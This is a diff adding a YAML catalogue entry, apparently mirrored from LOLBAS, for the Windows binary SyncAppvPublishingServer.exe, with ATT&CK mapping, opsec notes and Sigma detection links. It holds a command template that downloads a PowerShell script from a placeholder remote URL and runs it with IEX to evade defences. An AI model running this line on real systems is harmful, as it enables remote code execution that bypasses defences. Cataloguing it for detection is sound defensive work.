@@ -1,0 +1,99 @@
+id: lolbas/T1NCaW5hcmllcy9TeW5jYXBwdnB1Ymxpc2hpbmdzZXJ2ZXIueW1s/RXhlY3V0ZQ/0
+type: binary
+platform: windows
+name: SyncAppvPublishingServer.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1218
+opsec:
+  noise: high
+  triggers: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_script/posh_ps_syncappvpublishingserver_exe.yml
+  - https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_module/posh_pm_syncappvpublishingserver_exe.yml
+  - https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_execute_psh.yml
+commands:
+- template: SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}')
+    | IEX"
+  comment: Example command on how inject Powershell code into the process
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: SyncAppvPublishingServer.exe
+      category: Execute
+      privileges: User
+      mitre_id: T1218
+      source_file: OSBinaries/Syncappvpublishingserver.yml
+      command_source_index: 0
+      document_utf8: "---\nName: SyncAppvPublishingServer.exe\nDescription: Used by App-v to get App-v\
+        \ server lists\nAuthor: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: SyncAppvPublishingServer.exe\
+        \ \"n;(New-Object Net.WebClient).DownloadString('{REMOTEURL:.ps1}') | IEX\"\n    Description:\
+        \ Example command on how inject Powershell code into the process\n    Usecase: Use SyncAppvPublishingServer\
+        \ as a Powershell host to execute Powershell code. Evade defensive counter measures\n    Category:\
+        \ Execute\n    Privileges: User\n    MitreID: T1218\n    OperatingSystem: Windows 10 1709, Windows\
+        \ 10 1703, Windows 10 1607\n    Tags:\n      - Execute: PowerShell\nFull_Path:\n  - Path: C:\\\
+        Windows\\System32\\SyncAppvPublishingServer.exe\n  - Path: C:\\Windows\\SysWOW64\\SyncAppvPublishingServer.exe\n\
+        Detection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_script/posh_ps_syncappvpublishingserver_exe.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/powershell/powershell_module/posh_pm_syncappvpublishingserver_exe.yml\n\
+        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_syncappvpublishingserver_execute_psh.yml\n\
+        \  - IOC: SyncAppvPublishingServer.exe should never be in use unless App-V is deployed\nResources:\n\
+        \  - Link: https://twitter.com/monoxgas/status/895045566090010624\nAcknowledgement:\n  - Person:\
+        \ Nick Landers\n    Handle: '@monoxgas'\n"
+      document_sha256: sha256:e08755e3180119863d8b59965650e14abee2f7f0ea4b7b756712a62afae11037
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1218
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:b0f27eda5ff871346aec20d92aad19d5b23b44c066e92b422fd9c58e3c1e5425
